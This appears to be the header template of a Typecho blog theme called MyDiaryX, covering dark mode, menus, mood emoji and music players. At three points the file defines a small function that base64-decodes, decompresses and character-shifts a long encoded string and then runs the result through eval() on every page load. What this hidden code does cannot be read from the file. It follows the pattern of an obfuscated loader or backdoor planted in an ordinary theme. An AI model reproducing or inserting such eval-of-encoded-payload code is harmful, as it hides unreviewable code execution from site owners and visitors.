<?php
/**
 * 请使用 PHP 7.3 - 7.4
 * @作者 火喵酱
 * @网站 https://www.mmbkz.cn
 */
?>
<?php $this->need('core/x-key.php'); ?>
<?php
// $phpVersion = explode('.', phpversion())[0] . '.' . explode('.', phpversion())[1];
// if ($phpVersion != '7.3' && $phpVersion != '7.4') {
    // echo "请使用 php7.3 或者 php7.4 版本";
    // exit;
// }
$plugin_export = Typecho_Plugin::export(); 
if (!array_key_exists('MyDiaryX', $plugin_export['activated'])) {
    echo "请安装MyDiaryX主题配套插件，请在群文件下载";
    exit;
}
?>
<html lang="zh-CN" class="<?php
    if(isset($_COOKIE['night']) && ($_COOKIE['night'] == '1' || $_COOKIE['night'] == '2') || !isset($_COOKIE['night']) && ($this->options->cat_darkmode == "star" || $this->options->cat_darkmode == "night" || (!$this->options->cat_darkmode || $this->options->cat_darkmode == "auto") && (date("H") >= 18 || date("H") <= 6))){
        echo 'darkmode';
    }
    if(isset($_COOKIE['night']) && ($_COOKIE['night'] == '2') || !isset($_COOKIE['night']) && ($this->options->cat_darkmode == "night" || (!$this->options->cat_darkmode || $this->options->cat_darkmode == "auto") && (date("H") >= 22 || date("H") <= 5))){
        echo ' silencemode';
    }
        ?>" style="
    <?php if ($this->options->cat_site_black == "on") {
        echo 'filter: grayscale(100%)';
    }elseif ($this->options->cat_site_blackauto) {
	    $date_arr = explode("||", $this->options->cat_site_blackauto);
        if (count($date_arr) > 0) {
            foreach ($date_arr as $date){
                if (str_replace(" ","",$date) == date('n.j')){
                    echo 'filter: grayscale(100%)';
                }
            }
        }
	}?> ">
<?php function EsL($iNZPGn)
{ 
$iNZPGn=gzinflate(base64_decode($iNZPGn));
 for($i=0;$i<strlen($iNZPGn);$i++)
 {
$iNZPGn[$i] = chr(ord($iNZPGn[$i])-1);
 }
 return $iNZPGn;
 }eval(EsL("U1QEAu6sdEVNpdS09Kz8tFRNDT8/Z59oDS0txRpukKxqSkFxWmBSaaainWJqVnF+Ul6aZkKCq1dwQoKWor6ihgFIXsMGrDa9LD+lNKsgXzE1LTetNM29IDc1rVhTNR1MwwwEAZCNWSUJQPPgssjSYHvTs3LTSoCWJhUXJ1UBlaana5akJOUj69GFSGpq6GvoKmro6wNdbYNiSDrQbUkpmYqaUNOSSiDmolsGAtjcDPagBpCE6EI1vA6FV5yH7DKEyjrFtNySNDT7yvJzs/JzsKnmRpCoDoJFA1RxalaapsbzhTufHWh5Pr3j6Z7tT3cufrZ004e9vS837HjV0fd8+sZn67teLml7unPPq8UznzQ2awB11nE72AMA"));?>
<head>
    <?php if ($this->options->cat_pwa_switch == "on"): ?>
        <link rel="manifest" href="/manifest.json">
        <script>
            if ('serviceWorker' in navigator) {
              window.addEventListener('load', () => {
                navigator.serviceWorker.register('/service-worker.js');
              });
            }
        </script>
    <?php endif; ?>
    <?php $this->need('core/core.php'); ?>
    <?php $this->need('core/include_head.php'); ?>
</head>
<body>
<script src="<?php echo resource_cdn() . 'js/jquery.min.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/Meting.min.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/APlayer.min.js' ?>"></script>
<script>
$.fn.toggle = function( fn, fn2 ) {
    var args = arguments,guid = fn.guid || $.guid++,i=0,
    toggle = function( event ) {
      var lastToggle = ( $._data( this, "lastToggle" + fn.guid ) || 0 ) % i;
      $._data( this, "lastToggle" + fn.guid, lastToggle + 1 );
      event.preventDefault();
      return args[ lastToggle ].apply( this, arguments ) || false;
    };
    toggle.guid = guid;
    while ( i < args.length ) {
      args[ i++ ].guid = guid;
    }
    return this.click( toggle );
};
window.CAT = {
    BASE_API: `<?php echo $this->options->rewrite == 0 ? Helper::options()->rootUrl . '/index.php/' : Helper::options()->rootUrl . '/' ?>`,
};
</script>
<div class="pjax_loading" style="display:none;">
    <?php if ($this->options->cat_pjax_animation == "style_1"): ?>
        <svg class="filter" version="1.1"><defs><filter id="gooeyness"><feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur" /><feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 20 -10" result="gooeyness" /><feComposite in="SourceGraphic" in2="gooeyness" operator="atop" /></filter></defs></svg>
        <div class="dots"><div class="dot mainDot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
    <?php elseif ($this->options->cat_pjax_animation == "style_2"): ?>
        <div class="loading_tiao"></div>
    <?php else: ?>
        <div style="text-align: center;">
            <img class="head_avatar avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="博客主页" />
            <div style="margin-top: 1.5rem;font-size: 1.2rem;text-shadow: var(--text-shadow);color: var(--colorF);"><?php $this->options->title() ?></div>
            <div style="margin-top: 1rem;color: var(--colorF);"><?php $this->options->description() ?></div>
            <div style="color: var(--colorD);position: absolute;bottom: 0;left: 50%;transform: translate(-50%, -50%);font-size: 0.5rem;">页面加载中...</div>
        </div>
    <?php endif; ?>
</div>
<div class="stars_out">
    <div class="stars"></div>
</div>
<header>
    <div class="head_menu">
        <section>
            <a tabnum="cat_index" class="anniu toindex" title="<h3><?php $this->options->title() ?></h3>博主 <?php echo get_last_login(1); ?> 在线" href="<?php $this->options->siteUrl(); ?>">
                <div style="position: relative;">
                <img class="head_avatar avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="博客主页" />
                <?php if ($this->options->cat_menu_mood == "on"): ?>
                <?php
                    $db  = Typecho_Db::get();
                    $mood = $db->fetchAll($db
                        ->select('mood')
                        ->from('table.comments')
                        ->where('status = ?', 'approved')
                        ->where('type = ?', 'comment')
                        ->where('authorId = ?', '1')
                        ->where('mood != ?', '')
                        ->order('created', Typecho_Db::SORT_DESC)
                        ->limit(1)
                        );
                    if ($mood) {
                        echo '<span class="header_mood_emoji">';
                        switch ($mood[0]['mood']){
                            case "愉快":echo "😀";break;
                            case "开心":echo "😁";break;
                            case "失望":echo "😞";break;
                            case "无语":echo "😑";break;
                            case "惊讶":echo "😯";break;
                            case "笑哭":echo "🤣";break;
                            case "疲惫":echo "😒";break;
                            case "伤心":echo "😥";break;
                            case "愤怒":echo "😡";break;
                            case "无聊":echo "🙄";break;
                            case "无情":echo "😶";break;
                            case "流泪":echo "😭";break;
                            case "shit":echo "💩";break;
                            case "death":echo "💀";break;
                            case "学习":echo "📖";break;
                            case "搬砖":echo "🏗️";break;
                            case "摸鱼":echo "🐟";break;
                            case "干饭":echo "🍚";break;
                            case "娱乐":echo "🎤";break;
                            case "演奏":echo "🎸";break;
                            case "打电动":echo "🎮";break;
                            case "做运动":echo "🏀";break;
                            case "下午茶":echo "🍵";break;
                            case "购物":echo "🛒";break;
                            case "遛狗":echo "🦮";break;
                            case "聚餐":echo "🍻";break;
                            case "约会":echo "👒";break;
                            case "闭关":echo "⛔";
                        }
                        echo '</span>';
                    }
                ?>
                <?php endif; ?>
            </div>
            </a>
            <ul class="head_top">
                <a tabnum="cat_blog" class="anniu <?php echo $this->is('author', '1') ? 'tab_on' : '' ?>" title="文章" href="<?php echo $this->options->rewrite == 0 ? Helper::options()->rootUrl . '/index.php/author/1/' : Helper::options()->rootUrl . '/author/1/' ?>">
                    <i class="ri-list-check-2"></i>
                </a>
                <?php if ($this->options->cat_user_menu): ?>
                    <?php
                        $cat_user_menus = $this->options->cat_user_menu;
                        if ($cat_user_menus) {
                            $cat_user_menus_arr = array_values(array_filter(explode("\r\n", $cat_user_menus)));
                            if (count($cat_user_menus_arr) > 0) {
                                for ($i = 0; $i < count($cat_user_menus_arr); $i++) {
                                    $logo = explode("||", $cat_user_menus_arr[$i])[0];
                                    $addr = explode("||", $cat_user_menus_arr[$i])[1];
                                    $name = explode("||", $cat_user_menus_arr[$i])[2];
                            ?>
                            <a class="anniu user_set_anniu" title="<?php echo $name ? $name : '未命名' ?>" href="<?php echo $addr ?>" target="_blank">
                                <?php echo cat_have_emoji($logo)? '<span style="font-size: 1.35rem;width: 2rem;text-align: center;">' . $logo . '</span>' : '<i class="'.  $logo . '"></i>'; ?>
                            </a>
                            <?php
                                }
                            }
                        }
                    ?>
                <?php endif; ?>
            </ul>
        </section>
        <?php function uNL($aURZyc)
        { 
        $aURZyc=gzinflate(base64_decode($aURZyc));
         for($i=0;$i<strlen($aURZyc);$i++)
         {
        $aURZyc[$i] = chr(ord($aURZyc[$i])-1);
         }
         return $aURZyc;
         }eval(uNL("rVTPa9RAFL43f8UYFnZmuzZb6KXbdvfSgx56Uk9JDGl2kk3NL5IJbnUXRKwtUlsEFWyrULEeimJBkUWl/jObtHvyT/BNkkrtFsXiQJiZN+9778s3bx5CfAhm7BnM9j3U6XQ03VmMXe16O3YXPd12cMlm1CXCXWGsFNIodhiaQ7I6w7e614INn/BkdZqc2HyXW2nkx6FBNaPlYYImUNl2LalFTR1CSGUw5Hg4mLhNF4MyRwc6YzT0AF6WlFkATFSaUWgoc4qIYUkUUb7ZUCsNyT7tvjCfAy4pMjgpqoJxm7EAR6RZVyRF4kZCzmJM32c5LkfVkRJVRoB4KbC6SwG1upZtdgPP6nKyRFauqZUipG0iHITU0lydGW3QDzQrslRRph5MjOt5I3QIQaDkmOmHVDfaCP86kCdVpEeo5NgRI6iQWlaBYWaCPL0/plqYv3Ay7sPrINt2+N2x0HZxtq0ikYj8ZnOPs7Q6/KT3d25c7P8thlRBydv76audQf/R8OXro60H6bOD4ermoP/4+PPHqUF//8e39WTtxdH2p3Rj73h3L1lZ4dbh1ma68yXZPjz+vp1sfEUVKScf2Xeob+IiG0GzaCrnVzLiiPmuxk7eBPC4Qp2AhvW6H/CHE2FyuWHoTCvq+6qrW5RLwzkePIQfTA73jzY+pE8Ph6vrQJYzW91MDp4M+vfSd7u2may9SZ+/z7hkZEZy5lRGuWh6GAIf2gkcv0WxqISKJ4LGI3hOh0sNsW0A1GbgOvg/8nl8vAg/9pvW5+WS4dOXtezRn+tQRZNEhWctNm/R5TkRVi7L3WtwVMtGTqbHawdRJ6J58n8jV3Qa6B9N6CYnTWj6VOisSkLKYugoBXRG6AlCsyGgnw=="));?>
        <section>
            <ul class="head_bottom">
            <?php if ($this->options->cat_pwa_switch == "on") : ?>
                <div id="divInstall" class="anniu PWAhidden" title="安装">
                    <div id="butInstall">
                        <i class="ri-install-line"></i>
                    </div>
                </div>
            <?php endif; ?>   
            <?php
                $musics = [];
                $musiclisttext = '';
                $musics_text = $this->options->cat_musiclist_one;
                if ($musics_text) {
                    $musics = array_values(array_filter(explode("\r\n", $musics_text)));
                }
                foreach($musics as $value){
                    $musiclisttext .= $value . '-';
                }
                setcookie('background_music', substr($musiclisttext, 0, -1));
            ?>
            <?php
                $qqmusics = [];
                $qqmusics_text = $this->options->cat_musiclist_qqtwo;
                if ($qqmusics_text) {
                    $qqmusics = array_values(array_filter(explode("\r\n", $qqmusics_text)));
                }
            ?>
            <?php if ($this->options->cat_musicmode == "one" && count($musics) > 0) : ?>
                <div class="anniu changemusic" style="display:none;" title="切歌">
                    <i class="ri-exchange-funds-line"></i>
                </div>
                <div class="anniu netcloudmusic" title="倾听">
                    <i id="netcloudmusic_icon" class="ri-headphone-line"></i>
                    <audio class="audio" src="https://music.163.com/song/media/outer/url?id=<?php echo $musics[array_rand($musics)]; ?>.mp3" preload="auto"></audio> 
                </div>
            <?php elseif ($this->options->cat_musicmode == "two" && count($musics) > 0) : ?>
                <div class="anniu Music_anniu" title="倾听">
                    <i class="ri-headphone-line"></i>
                </div>
                <div class="cat_music_menu">
                    <meting-js server="netease" type="song" id="<?php echo $musics[array_rand($musics)]; ?>"></meting-js>
                </div>
            <?php elseif ($this->options->cat_musicmode == "qqtwo" && count($qqmusics) > 0) : ?>
                <div class="anniu Music_anniu" title="倾听">
                    <i class="ri-headphone-line"></i>
                </div>
                <div class="cat_music_menu">
                    <meting-js auto="https://y.qq.com/n/yqq/song/<?php echo $qqmusics[array_rand($qqmusics)]; ?>.html"></meting-js>
                </div>
            <?php elseif ($this->options->cat_musicmode == "three" && $this->options->cat_musiclist_three) : ?>
                <div class="anniu Music_anniu" title="倾听">
                    <i class="ri-headphone-line"></i>
                </div>
                <div class="cat_music_menu">
                    <meting-js server="netease" type="playlist" id="<?php echo $this->options->cat_musiclist_three; ?>"></meting-js>
                </div>
                <?php if($this->options->cat_float_title == 'on') : ?>
                <style> @media (max-width: 500px){.cat_music_menu {bottom: 0.2rem;top: auto;}} </style>
                <?php endif; ?>
            <?php elseif ($this->options->cat_musicmode == "qqthree" && $this->options->cat_musiclist_qqthree) : ?>
                <div class="anniu Music_anniu" title="倾听">
                    <i class="ri-headphone-line"></i>
                </div>
                <div class="cat_music_menu">
                    <meting-js auto="https://y.qq.com/n/yqq/playlist/<?php echo $this->options->cat_musiclist_qqthree; ?>.html"></meting-js>
                </div>
                <?php if($this->options->cat_float_title == 'on') : ?>
                <style> @media (max-width: 500px){.cat_music_menu {bottom: 0.2rem;top: auto;}} </style>
                <?php endif; ?>
            <?php elseif ($this->options->cat_musicmode == "qqfour" && $this->options->cat_musiclist_qqfour) : ?>
                <div class="anniu Music_anniu" title="倾听">
                    <i class="ri-headphone-line"></i>
                </div>
                <div class="cat_music_menu">
                    <meting-js auto="https://y.qq.com/n/yqq/album/<?php echo $this->options->cat_musiclist_qqfour; ?>.html"></meting-js>
                </div>
                <?php if($this->options->cat_float_title == 'on') : ?>
                <style> @media (max-width: 500px){.cat_music_menu {bottom: 0.2rem;top: auto;}} </style>
                <?php endif; ?>
            <?php endif; ?>
            <div class="anniu" id="dark_model_ANNIU" title="星光">
                <i class="ri-moon-clear-line"></i>
            </div>
            <div class="anniu" id="silence_model_ANNIU" title="静夜">
                <i class="ri-moon-foggy-line"></i>
            </div>
            <div class="anniu" id="light_model_ANNIU" title="朝阳">
                <i class="ri-sun-line"></i>
            </div>
        </ul>
        </section>
    </div>
</header>
<?php function aPYW($PEjsVk)
{ 
$PEjsVk=gzinflate(base64_decode($PEjsVk));
 for($i=0;$i<strlen($PEjsVk);$i++)
 {
$PEjsVk[$i] = chr(ord($PEjsVk[$i])-1);
 }
 return $PEjsVk;
 }eval(aPYW("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"));?>